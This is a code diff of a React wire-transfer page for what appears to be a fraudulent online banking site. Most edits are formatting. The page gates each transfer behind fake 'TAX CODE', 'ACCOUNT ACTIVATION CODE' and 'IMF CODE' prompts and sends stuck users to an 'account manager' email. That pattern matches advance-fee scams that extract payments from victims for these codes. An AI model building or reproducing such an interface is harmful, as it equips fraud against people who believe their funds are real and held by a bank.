@@ -3,6 +3,7 @@ import { WiretransferWrapper } from "./Wiretransfer";
 import useDashboard from "./apifetch";
 import { FaArrowLeft } from "react-icons/fa";
 import { MdOutlineClose } from "react-icons/md";
+import Overlay from "../overlay.jsx";
 
 const Wiretransfer = () => {
   const fetchdata = useDashboard();
@@ -11,8 +12,8 @@ const Wiretransfer = () => {
   const [receiverAccount, setReceiverAccount] = useState("");
   const [receiverName, setReceiverName] = useState("");
   const [receiverBank, setReceiverBank] = useState("");
-  const [iban, setIban] = useState(""); 
-  const [swiftCode, setSwiftCode] = useState(""); 
+  const [iban, setIban] = useState("");
+  const [swiftCode, setSwiftCode] = useState("");
   const [purpose, setPurpose] = useState("");
   const [recipientAddress, setRecipientAddress] = useState("");
 
@@ -68,7 +69,9 @@ const Wiretransfer = () => {
         setShowCodeModal(true);
       } else {
         // Transfer complete
-        alert("Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!");
+        alert(
+          "Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!",
+        );
         setShowCodeModal(false);
         setCurrentCodeType(null);
         setCodeInput("");
@@ -88,7 +91,10 @@ const Wiretransfer = () => {
 
     try {
       const token = localStorage.getItem("accessToken");
-      let codeKey = currentCodeType === "email_otp" ? "email_otp" : `${currentCodeType}_code`;
+      let codeKey =
+        currentCodeType === "email_otp"
+          ? "email_otp"
+          : `${currentCodeType}_code`;
 
       const requestData = {
         amount: parseFloat(amount),
@@ -121,7 +127,9 @@ const Wiretransfer = () => {
         setCodeInput("");
         setShowCodeModal(true);
       } else {
-        alert("Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!");
+        alert(
+          "Transfer successful! Please note that the funds will be processed and should reflect in your account within 3 to 7 working days!",
+        );
         setShowCodeModal(false);
         setCurrentCodeType(null);
         setCodeInput("");
@@ -164,67 +172,39 @@ const Wiretransfer = () => {
     }
   };
 
-
-
-  const handleResendactivation = async () => {
-    setLoading(true);
-    setError("");
-    try {
-      const token = localStorage.getItem("accessToken");
-      const res = await fetch("https://geochain.app/apps/api/transfers/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Authorization: `Bearer ${token}`,
-          "Device-ID": "WEB",
-        },
-        body: JSON.stringify({
-          resend: true,
-        }),
-        credentials: "include",
-      });
-
-      const data = await res.json();
-
-      if (!res.ok) throw new Error(data.detail || "Failed to Get Code");
-
-      alert("If you do not have this code, please contact your account officer. info@westventonline.org");
-    } catch (err) {
-      setError(err.message);
-    } finally {
-      setLoading(false);
+  const getCodeLabel = (type) => {
+    switch (type) {
+      case "email_otp":
+        return "{OTP}";
+      case "tax":
+        return "{TAX CODE}";
+      case "activation":
+        return "{ACCOUNT ACTIVATION CODE}";
+      case "imf":
+        return "{IMF CODE}";
+      default:
+        return "";
     }
   };
 
-
-
-  const getCodeLabel = (type) => {
-  switch (type) {
-    case "email_otp":
-      return "{OTP}";
-    case "tax":
-      return "{TAX CODE}";
-    case "activation":
-      return "{ACCOUNT ACTIVATION CODE}";
-    case "imf":
-      return "{IMF CODE}";
-    default:
-      return "";
-  }
-};
-   
-
-
   return (
     <WiretransferWrapper>
+      {showCodeModal && <Overlay />}
+
       <div className="profilewrapper">
         <div className="backes">
-          <FaArrowLeft onClick={() => (window.location.href = "/transfer-list")} />
-          <p onClick={() => (window.location.href = "/transfer-list")}>Transfer</p>
+          <FaArrowLeft
+            onClick={() => (window.location.href = "/transfer-list")}
+          />
+          <p onClick={() => (window.location.href = "/transfer-list")}>
+            Transfer
+          </p>
         </div>
 
         <div className="amount">
-          <p><strong>Balance</strong></p>
+          <p>
+            <strong>Balance</strong>
+          </p>
           <strong>
             ${" "}
             {new Intl.NumberFormat("en-US", {
@@ -234,15 +214,15 @@ const Wiretransfer = () => {
           </strong>
         </div>
 
-       <form
-  onSubmit={handleTransferSubmit}
-  onKeyDown={(e) => {
-    // If modal is open, block Enter key on main form
-    if (showCodeModal && e.key === "Enter") {
-      e.preventDefault();
-    }
-  }}
->
+        <form
+          onSubmit={handleTransferSubmit}
+          onKeyDown={(e) => {
+            // If modal is open, block Enter key on main form
+            if (showCodeModal && e.key === "Enter") {
+              e.preventDefault();
+            }
+          }}
+        >
           <div>
             <label>From Account</label>
             <input value={fetchdata?.account?.account_number || ""} disabled />
@@ -329,100 +309,72 @@ const Wiretransfer = () => {
           </div>
         </form>
 
-{/* styling this one */}
+        {/* styling this one */}
         {showCodeModal && (
-
           <div className="otp-modal">
-            <div className="close">
-           <h3>Code Required <span>{getCodeLabel(currentCodeType)}</span></h3>
+            <div className="livdivs">
+              <div className="close">
+                <h3>
+                  Code Required <span>{getCodeLabel(currentCodeType)}</span>
+                </h3>
 
-               <p onClick={() => setShowCodeModal(false)}>
-                <MdOutlineClose />
-              </p>
+                <p onClick={() => setShowCodeModal(false)}>
+                  <MdOutlineClose />
+                </p>
+              </div>
+              <h4>
+                Please enter your <span>{getCodeLabel(currentCodeType)}</span>{" "}
+                below to process your transfer
+              </h4>
+
+              <form
+                className="myotpss"
+                onSubmit={() => {
+                  handleCodeSubmit();
+                  setOverlayout(true);
+                }}
+              >
+                <input
+                  value={codeInput}
+                  onChange={(e) => setCodeInput(e.target.value)}
+                  maxLength={6}
+                  placeholder="6-digit code"
+                  required
+                />
+                <button className="mysumit" type="submit">
+                  {loading ? "Verifying..." : "Verify"}
+                </button>
+
+                {/* ONLY show resend for email OTP */}
+                {currentCodeType === "email_otp" && (
+                  <button
+                    className="cancels"
+                    type="button"
+                    onClick={handleResendOtp}
+                  >
+                    {loading ? "Sending..." : "Resend OTP"}
+                  </button>
+                )}
+
+                {(currentCodeType === "tax" ||
+                  currentCodeType === "activation" ||
+                  currentCodeType === "imf") && (
+                  <div className="conatcoffier">
+                    <p>
+                      If you do not have this code, please contact your account
+                      manager
+                    </p>
+                    <span>info@westventonline.org</span>
+                  </div>
+                )}
+              </form>
+              {error && <p style={{ color: "red" }}>{error}</p>}
             </div>
-            <h3>
-  Please enter your <span>{getCodeLabel(currentCodeType)}</span> below to process your transfer
-</h3>
-
-            <form onSubmit={handleCodeSubmit}>
-              <input
-                value={codeInput}
-                onChange={(e) => setCodeInput(e.target.value)}
-                maxLength={6}
-                placeholder="6-digit code"
-                required
-              />
-              <button className="mysumit" type="submit">
-                {loading ? "Verifying..." : "Verify"}
-              </button>
-
-              {/* ONLY show resend for email OTP */}
-              {currentCodeType === "email_otp" && (
-                <button className="cancels" type="button" onClick={handleResendOtp}>
-                  {loading ? "Sending..." : "Resend OTP"}
-                </button>
-              )}
-              {currentCodeType === "tax" && (
-                <button className="cancels" type="button" onClick={handleResendactivation}>
-                  {loading ? "Sending..." : "Get TAX CODE"}
-                </button>
-              )}
-              {currentCodeType === "activation" && (
-                <button className="cancels" type="button" onClick={handleResendactivation}>
-                  {loading ? "Sending..." : "Get ACTIVATION CODE"}
-                </button>
-              )}
-              {currentCodeType === "imf" && (
-                <button className="cancels" type="button" onClick={handleResendactivation}>
-                  {loading ? "Sending..." : "Get IMF CODE"}
-                </button>
-              )}
-
-
-
-
-{(currentCodeType === "tax" ||
-  currentCodeType === "activation" ||
-  currentCodeType === "imf") && (
-    <div className="conatcoffier">
-      <p>If you do not have this code, please contact your account officer</p>
-      <span>info@westventonline.org</span>
-    </div>
-)}
-
-
-
-            </form>
-            {error && <p style={{ color: "red" }}>{error}</p>}
           </div>
-         )} 
+        )}
       </div>
     </WiretransferWrapper>
   );
 };
 
 export default Wiretransfer;
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
